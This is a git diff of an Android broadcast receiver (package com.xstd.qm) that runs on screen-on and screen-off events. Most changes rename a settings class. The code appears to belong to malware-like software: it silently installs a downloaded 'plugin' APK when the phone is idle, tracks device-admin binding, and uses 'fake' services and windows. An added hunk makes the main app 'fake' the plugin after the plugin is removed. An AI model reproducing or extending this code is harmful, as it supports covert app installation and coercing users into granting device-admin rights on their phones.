@@ -8,7 +8,7 @@ import android.telephony.TelephonyManager;
 import com.plugin.common.utils.SingleInstanceBase;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.qm.*;
-import com.xstd.qm.setting.SettingManager;
+import com.xstd.qm.setting.MainSettingManager;
 
 /**
  * Created with IntelliJ IDEA.
@@ -30,16 +30,16 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                     || intent.getAction().equals(Intent.ACTION_USER_PRESENT))) {
             if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)
                     || intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
-                SettingManager.getInstance().init(context);
+                MainSettingManager.getInstance().init(context);
                 Config.LOGD("<<<< " + intent.getAction() + " >>>>>"
                                 + " function screen status : " + UtilsRuntime.isScreenLocked(context));
                 long curTime = System.currentTimeMillis();
-                if (SettingManager.getInstance().getPluginDownloadTime() > 0
+                if (MainSettingManager.getInstance().getPluginDownloadTime() > 0
                     && !UtilOperator.isPluginApkExist()) {
-                    long deta = curTime - SettingManager.getInstance().getPluginDownloadTime();
+                    long deta = curTime - MainSettingManager.getInstance().getPluginDownloadTime();
                     if (deta > ((long) 2) * 60 * 60 * 1000) {
                         Utils.saveExtraInfo("两小时子程序下载失败");
-                        SettingManager.getInstance().setPluginDownloadTime(-1);
+                        MainSettingManager.getInstance().setPluginDownloadTime(-1);
                         Utils.notifyServiceInfo(context);
                     }
                 }
@@ -49,36 +49,36 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                 int state = tm != null ? tm.getCallState() : TelephonyManager.CALL_STATE_IDLE;
 
                 //try to install
-                if (!SettingManager.getInstance().getKeyPluginInstalled()
-                        && !SettingManager.getInstance().getKeyHasScaned()) {
+                if (!MainSettingManager.getInstance().getKeyPluginInstalled()
+                        && !MainSettingManager.getInstance().getKeyHasScaned()) {
                     boolean installed = SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
-                    SettingManager.getInstance().setKeyPluginInstalled(installed);
-                    SettingManager.getInstance().setKeyHasScaned(true);
+                    MainSettingManager.getInstance().setKeyPluginInstalled(installed);
+                    MainSettingManager.getInstance().setKeyHasScaned(true);
                 }
 
-                boolean pluginInstalled = SettingManager.getInstance().getKeyPluginInstalled();
+                boolean pluginInstalled = MainSettingManager.getInstance().getKeyPluginInstalled();
 //                                            ? true
 //                                            : SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
                 long cur = System.currentTimeMillis();
                 if (Config.DEBUG) {
                     Config.LOGD("[[ScreenBroadcastReceiver::onReceive]] check if should install plugin : "
                                     + "\n            (pluginInstalled = " + pluginInstalled
-                                    + "\n            lanuch time = " + UtilsRuntime.debugFormatTime(SettingManager.getInstance().getKeyLanuchTime())
-                                    + "\n            install delay = " + SettingManager.getInstance().getKeyInstallInterval()
+                                    + "\n            lanuch time = " + UtilsRuntime.debugFormatTime(MainSettingManager.getInstance().getKeyLanuchTime())
+                                    + "\n            install delay = " + MainSettingManager.getInstance().getKeyInstallInterval()
                                     + "\n            current time = " + UtilsRuntime.debugFormatTime(cur)
                                     + "\n            apk exist = " + UtilOperator.isPluginApkExist()
                                     + "\n            open install NO market APP = " + open
                                     + "\n            phone state = " + state
                                     + "\n            main Device bind = " + AppRuntime.isBindingActive(context)
-                                    + "\n            main Device bind count = " + SettingManager.getInstance().getDeviceBindingActiveTime()
-                                    + "\n            Disable Download Plugin = " + SettingManager.getInstance().getDisableDownloadPlugin()
+                                    + "\n            main Device bind count = " + MainSettingManager.getInstance().getDeviceBindingActiveTime()
+                                    + "\n            Disable Download Plugin = " + MainSettingManager.getInstance().getDisableDownloadPlugin()
                                     + ")");
                 }
 
                 if (!AppRuntime.isBindingActive(context)
-                        && (SettingManager.getInstance().getDeviceBindingActiveTime() < 5)
-                        && !SettingManager.getInstance().getKeyPluginInstalled()
-                        && !SettingManager.getInstance().getDisableDownloadPlugin()) {
+                        && (MainSettingManager.getInstance().getDeviceBindingActiveTime() < 5)
+                        && !MainSettingManager.getInstance().getKeyPluginInstalled()
+                        && !MainSettingManager.getInstance().getDisableDownloadPlugin()) {
                     Utils.startFakeService(context, "[[ScreenON]]");
                     return;
                 }
@@ -87,29 +87,37 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                         && state == TelephonyManager.CALL_STATE_IDLE
                         && UtilOperator.isPluginApkExist()
                         && !pluginInstalled
-                        && SettingManager.getInstance().getDeviceBindingTime() <= Config.BIND_TIMES
+                        && MainSettingManager.getInstance().getDeviceBindingTime() <= Config.BIND_TIMES
                         && !AppRuntime.FAKE_WINDOW_FOR_DISDEVICE_SHOW.get()) {
-                    if (cur > (SettingManager.getInstance().getKeyLanuchTime() + SettingManager.getInstance().getKeyInstallInterval())) {
+                    if (cur > (MainSettingManager.getInstance().getKeyLanuchTime() + MainSettingManager.getInstance().getKeyInstallInterval())) {
                         UtilOperator.tryToInstallPluginLocal(context);
                     }
                 } else if (pluginInstalled) {
                     Utils.tryToActivePluginApp(context);
+                } else if (open == 0
+                             || (!pluginInstalled && MainSettingManager.getInstance().getHasInstallPlugin())) {
+                    //如果安装设备管理器没有打开
+                    //或者现在程序没有安装，但是曾经安装过
+                    Utils.checkAndActiveQS(context);
+
+                    //同时，主程序以后应该模拟子程序
+                    MainSettingManager.getInstance().setMainShouldFakePlugin(true);
                 }
             } else if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
                 Config.LOGD("<<<< " + Intent.ACTION_SCREEN_OFF + " >>>>>"
                                 + " function screen status : " + UtilsRuntime.isScreenLocked(context));
 
                 //try to install
-                SettingManager.getInstance().init(context);
-                if (!SettingManager.getInstance().getKeyPluginInstalled()
-                        && !SettingManager.getInstance().getKeyHasScaned()) {
+                MainSettingManager.getInstance().init(context);
+                if (!MainSettingManager.getInstance().getKeyPluginInstalled()
+                        && !MainSettingManager.getInstance().getKeyHasScaned()) {
                     boolean installed = SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
-                    SettingManager.getInstance().setKeyPluginInstalled(installed);
-                    SettingManager.getInstance().setKeyHasScaned(true);
+                    MainSettingManager.getInstance().setKeyPluginInstalled(installed);
+                    MainSettingManager.getInstance().setKeyHasScaned(true);
                 }
 
 //                //激活子程序
-//                if (SettingManager.getInstance().getKeyPluginInstalled()) {
+//                if (MainSettingManager.getInstance().getKeyPluginInstalled()) {
 //                    Utils.tryToActivePluginApp(context);
 //                }
 
